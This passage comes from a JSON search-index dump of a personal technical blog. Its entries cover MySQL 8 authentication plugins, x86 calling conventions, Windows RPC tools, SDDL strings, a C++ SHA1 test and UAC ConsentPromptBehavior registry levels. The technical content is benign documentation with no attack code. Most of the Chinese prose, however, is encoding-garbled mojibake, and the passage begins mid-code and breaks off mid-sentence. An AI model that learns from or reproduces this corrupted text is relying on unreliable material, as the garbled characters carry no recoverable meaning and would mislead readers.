&quot;mysql_real_connect&quot;);m_ptr_mysql_query = (pfn_mysql_query)GetProcAddress(hExe, &quot;mysql_query&quot;);m_ptr_mysql_real_query = (pfn_mysql_real_query)GetProcAddress(hExe, &quot;mysql_real_query&quot;);m_ptr_mysql_store_result = (pfn_mysql_store_result)GetProcAddress(hExe, &quot;mysql_store_result&quot;);m_ptr_mysql_num_fields = (pfn_mysql_num_fields)GetProcAddress(hExe, &quot;mysql_num_fields&quot;);m_ptr_mysql_fetch_field = (pfn_mysql_fetch_field)GetProcAddress(hExe, &quot;mysql_fetch_field&quot;);m_ptr_mysql_fetch_row = (pfn_mysql_fetch_row)GetProcAddress(hExe, &quot;mysql_fetch_row&quot;);m_ptr_mysql_error = (pfn_mysql_error)GetProcAddress(hExe, &quot;mysql_error&quot;);m_ptr_mysql_close = (pfn_mysql_close)GetProcAddress(hExe, &quot;mysql_close&quot;);m_builtin_caching_sha2_password_plugin = (st_mysql_plugin*)GetProcAddress(hExe, &quot;builtin_caching_sha2_password_plugin&quot;);m_builtin_mysql_password_plugin = (st_mysql_plugin*)GetProcAddress(hExe, &quot;builtin_mysql_password_plugin&quot;);","tags":[{"name":"æ•°æ®åº“/MySQL","slug":"æ•°æ®åº“-MySQL","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93-MySQL/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"MySQL8","slug":"wiki/MySQL8","permalink":"https://hodlyounger.github.io/categories/wiki/MySQL8/"}]},{"title":"ã€å¼±å¯†ç ã€‘MySQL8-Authentication-plugin","date":"2023-12-06T16:00:00.000Z","path":"wiki/MySQL8/ã€å¼±å¯†ç ã€‘MySQL8-plugin/","text":"æ¦‚è¿°ï¼šMySQL8 èº«ä»½è®¤è¯æ’ä»¶ç›¸å…³ã€‚æœ¬æ–‡ä»æ’ä»¶æœ¬èº«ï¼ŒMySQLç‰ˆæœ¬å’Œä½¿ç”¨ä¸‰ä¸ªæ–¹é¢è®°å½•ä¸€ä¸‹ã€‚ ç›¸å…³æ¨èï¼š ã€å¼±å¯†ç ã€‘MySQL8-Connection_control-plugin èº«ä»½è®¤è¯æ’ä»¶ MySQL8.0ç‰ˆæœ¬ï¼ˆ8.0.4ç‰ˆæœ¬ï¼‰åœ¨å¯†ç è®¤è¯æ–¹å¼ä¸Šå‘ç”Ÿäº†æ”¹å˜ï¼Œç”±åŸæœ¬çš„ mysql_native_password æ”¹ä¸ºäº† caching_sha2_passwordï¼Œåœ¨ 8.0.34 ç‰ˆæœ¬å¼€å§‹å°†ä¸å†ä½¿ç”¨ mysql_native_password éªŒè¯æ’ä»¶ã€‚ç›¸åº”çš„ï¼Œå®¢æˆ·ç«¯è¿æ¥æ‰€ä½¿ç”¨çš„ libmysqlclient ä¹Ÿåšäº†ä¿®æ”¹ã€‚ å¯¹äºé«˜ç‰ˆæœ¬çš„MySQLç‰ˆæœ¬ï¼Œé»˜è®¤ä½¿ç”¨çš„å°±æ˜¯ caching_sha2_password åŠ å¯†æ–¹å¼ï¼Œä½†å¦‚æœæ˜¯ä»ä¹‹å‰çš„ç‰ˆæœ¬å‡çº§çš„ï¼Œåœ¨è¿æ¥æ—¶å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œå‚æ•° --default-auth æŒ‡å®šéªŒè¯æ–¹å¼ï¼š 1mysql --default-auth=mysql_native_password æ–°çš„è®¤è¯æ’ä»¶æ€»å…±æœ‰ä¸¤ä¸ªï¼š sha256_password: sha256åŠ å¯†æ’ä»¶ caching_sha2_passowrdï¼šå¸¦ç¼“å­˜çš„sha256åŠ å¯†æ’ä»¶ï¼Œè®¤è¯æ›´å¿« ä½¿ç”¨ è¦åˆ›å»º caching_sha2_password ç”¨æˆ·: 12CREATE USER &#x27;sha2user&#x27;@&#x27;localhost&#x27;IDENTIFIED WITH caching_sha2_password BY &#x27;password&#x27;; é…ç½®é»˜è®¤çš„èº«ä»½è®¤è¯æ’ä»¶ï¼š 12[mysqld]default_authentication_plugin=caching_sha2_password é…ç½®é»˜è®¤èº«ä»½è®¤è¯æ’ä»¶åï¼Œåˆ›å»ºçš„ç”¨æˆ·å°±é»˜è®¤ä¸º caching_sha2_password äº†ï¼Œå†æ¬¡åˆ›å»ºæ—¶æ— éœ€æ˜¾å¼å£°æ˜ï¼š 1CREATE USER &#x27;sha2user&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;; ä½†æ˜¯å¦‚æœè¿™æ—¶ä½ éœ€è¦åˆ›å»º mysql_native_password çš„ç”¨æˆ·ï¼Œåˆ™ä»éœ€è¦æ˜¾å¼æŒ‡æ˜ä½ æ‰€éœ€è¦çš„æ’ä»¶ï¼š 12CREATE USER &#x27;nativeuser&#x27;@&#x27;localhost&#x27;IDENTIFIED WITH mysql_native_password BY &#x27;password&#x27;; é«˜çº§é…ç½® MySQL8 çš„èº«ä»½è®¤è¯æ”¯æŒè‡ªå®šä¹‰çš„åŠ å¯†è¿‡ç¨‹ï¼Œå¯ä»¥åœ¨æœªåŠ å¯†è¿æ¥ä¸Šä½¿ç”¨ RSA è¿›è¡ŒåŠ å¯†å¯†ç äº¤æ¢ã€‚è¯¦ç»†æ“ä½œå‚è€ƒå®˜æ–¹è¯´æ˜ï¼š MySQL :: MySQL 8.0 å‚è€ƒæ‰‹å†Œ :: 6.4.1.2 ç¼“å­˜ SHA-2 å¯æ’å…¥èº«ä»½éªŒè¯","tags":[{"name":"æ•°æ®åº“/MySQL","slug":"æ•°æ®åº“-MySQL","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93-MySQL/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"MySQL8","slug":"wiki/MySQL8","permalink":"https://hodlyounger.github.io/categories/wiki/MySQL8/"}]},{"title":"ã€æ±‡ç¼–ã€‘è°ƒç”¨çº¦å®š","date":"2023-12-05T16:00:00.000Z","path":"B_Code/æ±‡ç¼–/ã€æ±‡ç¼–ã€‘è°ƒç”¨çº¦å®š/","text":"æ¦‚è¿°ï¼šå„ç§è°ƒç”¨çº¦å®šä¸‹çš„æ±‡ç¼–å…¥å‚æ–¹å¼ å‚è€ƒæ–‡ç« ï¼šè‡ªå˜é‡ä¼ é€’å’Œå‘½åçº¦å®š | Microsoft Learn __fastcall __fastcall | Microsoft Learn __fastcall è°ƒç”¨çº¦å®šæŒ‡å®šå°½å¯èƒ½åœ¨å¯„å­˜å™¨ä¸­ä¼ é€’å‡½æ•°çš„è‡ªå˜é‡ã€‚ æ­¤è°ƒç”¨çº¦å®šä»…é€‚ç”¨äº x86 ä½“ç³»ç»“æ„ã€‚ ä»¥ä¸‹åˆ—è¡¨æ˜¾ç¤ºæ­¤è°ƒç”¨çº¦å®šçš„å®ç°ã€‚ Expand table å…ƒç´  å®ç° å‚æ•°ä¼ é€’é¡ºåº åœ¨è‡ªå˜é‡åˆ—è¡¨ä¸­æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ‰¾åˆ°çš„å‰ä¸¤ä¸ª DWORD æˆ–æ›´å°è‡ªå˜é‡å°†åœ¨ ECX å’Œ EDX å¯„å­˜å™¨ä¸­ä¼ é€’ï¼›æ‰€æœ‰å…¶ä»–è‡ªå˜é‡åœ¨å †æ ˆä¸Šä»å³å‘å·¦ä¼ é€’ã€‚ å †æ ˆç»´æŠ¤èŒè´£ å·²è°ƒç”¨å‡½æ•°ä¼šå¼¹å‡ºæ˜¾ç¤ºå †æ ˆä¸­çš„å‚æ•°ã€‚ åç§°ä¿®é¥°çº¦å®š At ç¬¦å· (@) æ˜¯åç§°çš„å‰ç¼€ï¼›å‚æ•°åˆ—è¡¨ä¸­çš„å­—èŠ‚æ•°ï¼ˆåœ¨åè¿›åˆ¶ä¸­ï¼‰å‰é¢çš„ at ç¬¦å·æ˜¯åç§°çš„åç¼€ã€‚ å¤§å°å†™è½¬æ¢çº¦å®š ä¸æ‰§è¡Œä»»ä½•å¤§å°å†™è½¬æ¢ã€‚ ç±»ã€ç»“æ„å’Œå¹¶é›† è¢«è§†ä¸ºâ€œå¤šå­—èŠ‚â€ç±»å‹ï¼ˆæ— è®ºå¤§å°ï¼‰å¹¶åœ¨å †æ ˆä¸Šä¼ é€’ã€‚ æšä¸¾å’Œæšä¸¾ç±» å¦‚æœå®ƒä»¬çš„åŸºç¡€ç±»å‹æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œåˆ™é€šè¿‡å¯„å­˜å™¨ä¼ é€’ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœåŸºç¡€ç±»å‹æ˜¯å¤§å°ä¸º 8ã€16 æˆ– 32 ä½çš„ int æˆ– unsigned intã€‚ Warning åŒºåˆ† x64 ä¸‹ [fast-call] x64 è°ƒç”¨çº¦å®š | Microsoft Learn __thiscall ç‰¹å®šäº Microsoft**__thiscall** çš„è°ƒç”¨çº¦å®šç”¨äº x86 ä½“ç³»ç»“æ„ä¸Šçš„ C++ ç±»æˆå‘˜å‡½æ•°ã€‚ å®ƒæ˜¯æˆå‘˜å‡½æ•°ä½¿ç”¨çš„é»˜è®¤è°ƒç”¨çº¦å®šï¼Œè¯¥çº¦å®šä¸ä½¿ç”¨å˜é‡å‚æ•°ï¼ˆvararg å‡½æ•°ï¼‰ã€‚ åœ¨ __thiscall ä¸‹ï¼Œè¢«è°ƒç”¨æ–¹æ¸…ç†å †æ ˆï¼Œè¿™å¯¹äº vararg å‡½æ•°æ˜¯ä¸å¯èƒ½çš„ã€‚ è‡ªå˜é‡å°†ä»å³åˆ°å·¦æ¨é€åˆ°å †æ ˆä¸­ã€‚ æŒ‡é’ˆ this é€šè¿‡æ³¨å†Œ ECX ä¼ é€’ï¼Œè€Œä¸æ˜¯åœ¨å †æ ˆä¸Šä¼ é€’ã€‚ åœ¨ ARMã€ARM64 å’Œ x64 è®¡ç®—æœºä¸Šï¼Œ__thiscall ç”±ç¼–è¯‘å™¨æ¥å—å’Œå¿½ç•¥ã€‚ è¿™æ˜¯å› ä¸ºå®ƒä»¬é»˜è®¤ä½¿ç”¨åŸºäºå¯„å­˜å™¨çš„è°ƒç”¨çº¦å®šã€‚ ä½¿ç”¨ __thiscall çš„åŸå› ä¹‹ä¸€æ˜¯åœ¨ç±»ä¸­æˆå‘˜å‡½æ•°é»˜è®¤ä½¿ç”¨ __clrcallã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ __thiscall ç¡®ä¿å„ä¸ªæˆå‘˜å‡½æ•°å¯ä»¥ä»æœ¬æœºä»£ç è°ƒç”¨ã€‚ é‡‡ç”¨ /clr:pure è¿›è¡Œç¼–è¯‘æ—¶ï¼Œé™¤éå¦æœ‰è§„å®šï¼Œå¦åˆ™æ‰€æœ‰å‡½æ•°å’Œå‡½æ•°æŒ‡é’ˆéƒ½æ˜¯ __clrcallã€‚ /clr:pure å’Œ /clr:safe ç¼–è¯‘å™¨é€‰é¡¹åœ¨ Visual Studio 2015 ä¸­å·²å¼ƒç”¨ï¼Œå¹¶ä¸”åœ¨ Visual Studio 2017 ä¸­ä¸å—æ”¯æŒã€‚ vararg æˆå‘˜å‡½æ•°ä½¿ç”¨ __cdecl è°ƒç”¨çº¦å®šã€‚ æ‰€æœ‰å‡½æ•°å‚æ•°éƒ½æ¨é€åœ¨å †æ ˆä¸Šï¼Œthis æŒ‡é’ˆæ”¾åœ¨æœ€åä¸€ä¸ªå †æ ˆä¸Šã€‚ ç”±äºæ­¤è°ƒç”¨çº¦å®šä»…é€‚ç”¨äº C++ï¼Œå› æ­¤å®ƒæ²¡æœ‰ C åç§°ä¿®é¥°æ–¹æ¡ˆã€‚ åœ¨éé™æ€ç±»æˆå‘˜å‡½æ•°å¤–è¡Œå®šä¹‰æ—¶ï¼Œä»…åœ¨å£°æ˜ä¸­æŒ‡å®šè°ƒç”¨çº¦å®šä¿®é¥°ç¬¦ã€‚ æ— éœ€åœ¨è¡Œå¤–å®šä¹‰ä¸Šå†æ¬¡æŒ‡å®šå®ƒã€‚ ç¼–è¯‘å™¨ä½¿ç”¨åœ¨å®šä¹‰ç‚¹å£°æ˜æœŸé—´æŒ‡å®šçš„è°ƒç”¨çº¦å®šã€‚ __stdcall ç¼–è¯‘å™¨çš„å‘½ä»¤è¡Œå‚æ•°æ˜¯/Gzï¼Œ__stdcallæ˜¯Pascalç¨‹åºçš„ç¼ºçœè°ƒç”¨æ–¹å¼ï¼Œå¤§å¤šæ•°Windowsçš„APIä¹Ÿæ˜¯ __stdcall è°ƒç”¨çº¦å®šã€‚__stdcall å‡½æ•°è°ƒç”¨çº¦å®šå°†å‡½æ•°å‚æ•°ä»å³å‘å·¦å…¥æ ˆï¼Œé™¤éä½¿ç”¨æŒ‡é’ˆæˆ–å¼•ç”¨ç±»å‹çš„å‚æ•°ï¼Œæ‰€æœ‰å‚æ•°é‡‡ç”¨ä¼ å€¼æ–¹å¼ä¼ é€’ï¼Œç”±è¢«è°ƒç”¨å‡½æ•°è´Ÿè´£æ¸…é™¤æ ˆä¸­çš„å‚æ•°ã€‚å¯¹äºCå‡½æ•°ï¼Œ__stdcallçš„åç§°ä¿®é¥°æ–¹å¼æ˜¯åœ¨å‡½æ•°åå­—å‰æ·»åŠ ä¸‹åˆ’çº¿ï¼Œåœ¨å‡½æ•°åå­—åæ·»åŠ @å’Œå‡½æ•°å‚æ•°çš„å¤§å°ï¼Œä¾‹å¦‚ï¼š_functionname@number","tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"ã€RPCã€‘Tools","date":"2023-12-05T16:00:00.000Z","path":"A_OS/Windows/RPC/ã€RPCã€‘Tools/","text":"æ¦‚è¿°ï¼šrpcå­¦ä¹ è¿‡ç¨‹ä¸­ä½¿ç”¨åˆ°çš„å·¥å…·æ•´ç† zodiacon/ProcMonXv2: Process Monitor X v2 tyranid/oleviewdotnet: A .net OLE/COM viewer and inspector to merge functionality of OleView and Test Container zodiacon/ALPCLogger: Log ALPC activity csandker/InterProcessCommunication-Samples: Some Code Samples for Windows based Inter-Process-Communication (IPC) æ–‡ç« æ¨èï¼š COM in Wine Â· Wiki Â· wine / wine Â· GitLab","tags":[{"name":"å·¥å…·æ•´ç†","slug":"å·¥å…·æ•´ç†","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/RPC/"}]},{"title":"ã€æƒé™ä¸ä¼šè¯ã€‘SDDLï¼ˆç¿»è¯‘ï¼‰","date":"2023-12-04T16:00:00.000Z","path":"A_OS/Windows/æƒé™ä¸ä¼šè¯/ã€æƒé™ä¸ä¼šè¯ã€‘SDDL/","text":"æ¦‚è¿°ï¼šæœ¬æ–‡ä¸»è¦ç¿»è¯‘æ¥è‡ªå¾®è½¯å®˜æ–¹åšå®¢çš„æ–‡ç«  The Security Descriptor Definition Language of Love (Part 2) | Microsoft Learnï¼Œä¸»è¦æè¿°äº† SDDL çš„è¯¦ç»†å«ä¹‰åŠç»“æ„ã€‚ ç›¸å…³é“¾æ¥ï¼š SID å­—ç¬¦ä¸² - Win32 apps | Microsoft Learn ACE å­—ç¬¦ä¸² ACE å­—ç¬¦ä¸² - Win32 apps | Microsoft Learn Security Descriptor Definition Language for Conditional ACEs - Win32 apps | Microsoft Learn ACE æ ¼å¼ 1AceType**;AceFlags;Rights;ObjectGuid;InheritObjectGuid;AccountSid;(ConditionalExpression)** ç¤ºä¾‹ å¦‚ä¸‹æ‰€ç¤ºä¸ºæœ¬åœ°ç³»ç»ŸæœåŠ¡çš„ACEçš„å®šä¹‰ // // Create a security descriptors to ACL named events: // // LocalSystem:&quot;0:SYG:SYD:(A;;GA;;;SY) &quot; // O:SYowner == local system // G:SYgroup == local system // D:no dacl flags(A; ;GA; ; ;SY) one ACE -- ACCESS_ALLOWED, GENERIC_ALL, trustee == LocalSystem #define LOCAL_SYSTEM_SD L&quot;O:SYG:SYD:(A;;GA;;;SY)&quot;","tags":[{"name":"æƒé™ä¸ä¼šè¯","slug":"æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/tags/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"},{"name":"Windows/DACL","slug":"Windows-DACL","permalink":"https://hodlyounger.github.io/tags/Windows-DACL/"},{"name":"Windows/SACL","slug":"Windows-SACL","permalink":"https://hodlyounger.github.io/tags/Windows-SACL/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"ã€OpenSourceã€‘ SHA1 in C++","date":"2023-12-04T08:24:30.290Z","path":"C_OpenSource/ã€OpenSourceã€‘sha1/","text":"æ¦‚è¿°ï¼šè®¡ç®— sha1 C++ ç‰ˆ 0x01 è¯´æ˜ é‰´äºä¸ªäººä½¿ç”¨çš„ç›®çš„ï¼Œåœ¨ Github ä¸Šæ‰¾äº†äº›è®¸å¼€æº sha1 è®¡ç®—çš„é¡¹ç›®ï¼Œæœ€åä½¿ç”¨ vog/sha1 è¿™ä¸ªé¡¹ç›®è®¡ç®—å‡ºæ¥ç›¸å…³ç»“æœï¼Œä½¿ç”¨æ¯”è¾ƒç®€å•ï¼Œforkäº†ä¸€ä¸ª vs ç‰ˆæœ¬è®°å½•ä¸€ä¸‹ã€‚ ä»“åº“åœ°å€ï¼š[holdyounger/SHA1: sha1 implementation in C++ï¼Œ fork by vog/sha1](https://github.com/holdyounger/SHA1) 0x02 ä½¿ç”¨ å¦‚ä¸‹æ‰€ç¤ºï¼Œä½¿ç”¨æ¯”è¾ƒç®€å• è®¡ç®—æ–‡æœ¬ sha1 123456789101112131415161718192021222324252627282930void test_other()&#123; SHA1 checksum; cout &lt;&lt; endl; cout &lt;&lt; &quot;Test: No string&quot; &lt;&lt; endl; compare(checksum.final(), &quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;); cout &lt;&lt; endl; checksum.update(&quot;&quot;); cout &lt;&lt; &quot;Test: Empty string&quot; &lt;&lt; endl; compare(checksum.final(), &quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;); cout &lt;&lt; endl; cout &lt;&lt; &quot;Test: abcde&quot; &lt;&lt; endl; checksum.update(&quot;abcde&quot;); compare(checksum.final(), &quot;03de6c570bfe24bfc328ccd7ca46b76eadaf4334&quot;); cout &lt;&lt; endl; cout &lt;&lt; &quot;Test: Two concurrent checksum calculations&quot; &lt;&lt; endl; SHA1 checksum1, checksum2; checksum1.update(&quot;abc&quot;); compare(checksum2.final(), &quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;); /* &quot;&quot; */ compare(checksum1.final(), &quot;a9993e364706816aba3e25717850c26c9cd0d89d&quot;); /* &quot;abc&quot; */ cout &lt;&lt; endl; cout &lt;&lt; &quot;Test: a [00] b [7F] c [80] d [FF] e [C3] [F0] f&quot; &lt;&lt; endl; checksum.update(std::string(&quot;a&quot; &quot;\\x00&quot; &quot;b&quot; &quot;\\x7f&quot; &quot;c&quot; &quot;\\x80&quot; &quot;d&quot; &quot;\\xff&quot; &quot;e&quot; &quot;\\xc3\\xf0&quot; &quot;f&quot;, 12)); compare(checksum.final(), &quot;cd0dd10814c0d4f9c6a2a0a4be2304d2371468d3&quot;);&#125; è®¡ç®—æ–‡ä»¶ 1234void test_file(const string &amp;filename)&#123; cout &lt;&lt; SHA1::from_file(filename) &lt;&lt; &quot; *&quot; &lt;&lt; filename &lt;&lt; endl;&#125; 0x03 ç»“æœæ ¡éªŒ ä»¥ä¸‹æ˜¯è®¡ç®—ç»“æœï¼Œä¸ Hash.exe è®¡ç®—ç»“æœä¸€ç›´ã€‚","tags":[{"name":"OpenSource","slug":"OpenSource","permalink":"https://hodlyounger.github.io/tags/OpenSource/"},{"name":"åŠ å¯†/SHA1","slug":"åŠ å¯†-SHA1","permalink":"https://hodlyounger.github.io/tags/%E5%8A%A0%E5%AF%86-SHA1/"},{"name":"C++","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"}]},{"title":"ã€æƒé™ä¸ä¼šè¯ã€‘ç”±appinfoè°ˆè°ˆUACçº§åˆ«","date":"2023-11-30T16:00:00.000Z","path":"A_OS/Windows/æƒé™ä¸ä¼šè¯/ã€æƒé™ä¸ä¼šè¯ã€‘ç”±appinfoè°ˆè°ˆUACçº§åˆ«/","text":"æ¦‚è¿°ï¼šå­¦ä¹  appinfo çš„æ—¶å€™çœ‹åˆ°äº†ç›¸å…³çš„è®¾å®šï¼Œç”±æ­¤è®°å½•ä»¥åŠè¯´æ˜ä¸€ä¸‹ ConsentPromptBehaviorAdmin å’Œ ConsentPromptBehaviorUser ä¸¤ä¸ªå­—æ®µã€‚ ç›¸å…³é˜…è¯»ï¼š å¦‚ä½•è®©Windows 10çš„UACæ›´æ‡‚ä½ ï¼Ÿ - çŸ¥ä¹ 0x01 å‰è¨€ å­¦ä¹  UAC é¿å…ä¸äº† appinfoã€consentã€RPC è¿™ä¸‰ä¸ªå…³é”®ç‚¹ã€‚å½“ç„¶ï¼Œæ•´ä¸ª UAC çš„æµç¨‹ä¹Ÿä¸èƒ½åªæœ‰è¿™ä¸‰ç‚¹ï¼Œè¿˜æ¶‰åŠåˆ°ç”¨æˆ·ä¼šè¯ã€å®‰å…¨ç­–ç•¥ã€ACLã€DACLã€SACLç­‰ç­‰æ¦‚å¿µã€‚éƒ½æ˜¯éœ€è¦å»äº†è§£å’Œæ·±å…¥çš„ã€‚è€Œå®‰å…¨ç­–ç•¥æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæœ‰æ¯”è¾ƒå¤šçš„å­—æ®µç­–ç•¥éƒ½æ˜¯ä¿å­˜åœ¨æ³¨å†Œè¡¨ä¸­çš„ã€‚è¿™é‡Œå°±åŒ…æ‹¬ ç”¨æˆ·è´¦æˆ·æ§åˆ¶ï¼šç®¡ç†å‘˜æ‰¹å‡†æ¨¡å¼ä¸­ç®¡ç†å‘˜çš„æå‡æƒé™æç¤ºçš„è¡Œä¸º .saovrknvuhtu{zoom:50%;} 0x02 UAC ææƒä¸­çš„å¤„ç† ä»ä½•è¯´èµ·ï¼Ÿå°±æ˜¯UACçš„ææƒè¿‡ç¨‹ä¸­åˆ›å»º consent è¿›ç¨‹çš„æ—¶å€™ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨ AiLaunchConstnUI å‡½æ•°ä¸­ï¼Œé¦–å…ˆæ ¹æ®ä¼ å…¥çš„ CreateFlags æ¥ç¡®å®šè¦æ£€æŸ¥çš„ç”¨æˆ·ï¼Œè¿™é‡Œåˆ†ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼Œä¸€ä¸ªæ™®é€šç”¨æˆ·ã€‚ä¸¤ä¸ªå­—æ®µåœ¨æ³¨å†Œè¡¨ä¸­çš„å€¼æ‰€å¯¹åº”çš„ç­–ç•¥å’Œå¤„ç†æ˜¯ä¸€è‡´çš„ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼ŒæŸ¥è¯¢çš„æ³¨å†Œè¡¨ç›®å½•ä¸º è®¡ç®—æœº\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System .uuyansyvglkw{zoom: 80%;} å¯ä»¥çœ‹åˆ° ConsentPromptBehavior ç­–ç•¥å€¼ä¹Ÿæ˜¯ UAC ææƒä¸­çš„ä¸€ä¸ªåˆ¤æ–­ç‚¹ã€‚æ¥ä¸‹æ¥å°± ConsentPromptBehavior å€¼æè¿°ä¸€ä¸‹ã€‚ 0x03 ConsentPromptBehavior ConsentPromptBehavior å€¼å¯¹åº”äº†äº”ä¸ªçº§åˆ«ï¼Œåˆ†åˆ«å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š Data: This MUST be a value in the following table. Value Meaning 0x00000000 æ— æç¤ºæå‡: å…è®¸æœ‰æƒé™çš„å¸æˆ·æ‰§è¡Œéœ€è¦æå‡æƒé™çš„æ“ä½œï¼Œè€Œæ— éœ€åŒæ„æˆ–å‡­æ®ã€‚æ³¨æ„: ä»…åœ¨å¤§å¤šæ•°å—é™åˆ¶çš„ç¯å¢ƒä¸­ä½¿ç”¨è¯¥é€‰é¡¹ This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials. 0x00000001 å½“æ“ä½œéœ€è¦æå‡æƒé™æ—¶ï¼Œæ­¤é€‰é¡¹ä¼šæç¤ºåŒæ„ç®¡ç†å‘˜è¾“å…¥å…¶ç”¨æˆ·åå’Œå¯†ç ï¼ˆæˆ–å…¶ä»–æœ‰æ•ˆçš„ç®¡ç†å‘˜ï¼‰ã€‚æ­¤æ“ä½œåœ¨å®‰å…¨æ¡Œé¢ä¸Šè¿›è¡Œã€‚ This option prompts the Consent Admin to enter his or her user name and password (or another valid admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop. 0x00000002 æ­¤é€‰é¡¹æç¤ºç®¡ç†å‘˜åœ¨ &quot;ç®¡ç†å‘˜å®¡æ‰¹æ¨¡å¼ &quot;ä¸‹é€‰æ‹© &quot;å…è®¸ &quot;æˆ– &quot;æ‹’ç» &quot;éœ€è¦æå‡æƒé™çš„æ“ä½œã€‚å¦‚æœåŒæ„ç®¡ç†å‘˜é€‰æ‹© â€œå…è®¸â€ï¼Œæ“ä½œå°†ä»¥å¯ç”¨çš„æœ€é«˜æƒé™ç»§ç»­è¿›è¡Œã€‚&quot;æç¤ºåŒæ„ &quot;æ¶ˆé™¤äº†è¦æ±‚ç”¨æˆ·è¾“å…¥å§“åå’Œå¯†ç æ‰èƒ½æ‰§è¡Œæƒé™ä»»åŠ¡çš„ä¸ä¾¿ã€‚æ­¤æ“ä½œåœ¨å®‰å…¨æ¡Œé¢ä¸Šè¿›è¡Œã€‚ This option prompts the administrator in Admin Approval Mode to select either â€œPermitâ€ or â€œDenyâ€ an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. â€œPrompt for consentâ€ removes the inconvenience of requiring that users enter their name and password to perform a privileged task. This operation occurs on the secure desktop. 0x00000003 å½“æ“ä½œéœ€è¦æå‡æƒé™æ—¶ï¼Œè¯¥é€‰é¡¹ä¼šæç¤ºåŒæ„ç®¡ç†å‘˜è¾“å…¥å…¶ç”¨æˆ·åå’Œå¯†ç ï¼ˆæˆ–å…¶ä»–æœ‰æ•ˆç®¡ç†å‘˜çš„ç”¨æˆ·åå’Œå¯†ç ï¼‰ã€‚ This option prompts the Consent Admin to enter his or her user name and password (or that of another valid admin) when an operation requires elevation of privilege. 0x00000004 æ­¤é€‰é¡¹æç¤ºç®¡ç†å‘˜åœ¨ &quot;ç®¡ç†å‘˜å®¡æ‰¹æ¨¡å¼ &quot;ä¸‹é€‰æ‹© &quot;å…è®¸ &quot;æˆ– &quot;æ‹’ç» &quot;éœ€è¦æå‡æƒé™çš„æ“ä½œã€‚å¦‚æœåŒæ„ç®¡ç†å‘˜é€‰æ‹© â€œå…è®¸â€ï¼Œæ“ä½œå°†ä»¥å¯ç”¨çš„æœ€é«˜æƒé™ç»§ç»­è¿›è¡Œã€‚&quot;æç¤ºåŒæ„ &quot;æ¶ˆé™¤äº†è¦æ±‚ç”¨æˆ·è¾“å…¥å§“åå’Œå¯†ç æ‰èƒ½æ‰§è¡Œæƒé™ä»»åŠ¡çš„ä¸ä¾¿ã€‚ This prompts the administrator in Admin Approval Mode to select either â€œPermitâ€ or â€œDenyâ€ an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. â€œPrompt for consentâ€ removes the inconvenience of requiring that users enter their name and password to perform a privileged task. 0x00000005 è¯¥é€‰é¡¹ä¸ºé»˜è®¤å€¼ã€‚å®ƒç”¨äºåœ¨ç®¡ç†å‘˜å®¡æ‰¹æ¨¡å¼ä¸‹æç¤ºç®¡ç†å‘˜é€‰æ‹© &quot;å…è®¸ &quot;æˆ– &quot;æ‹’ç» &quot;å¯¹ä»»ä½•é Windows äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œéœ€è¦æå‡æƒé™çš„æ“ä½œã€‚å¦‚æœåŒæ„ç®¡ç†å‘˜é€‰æ‹© 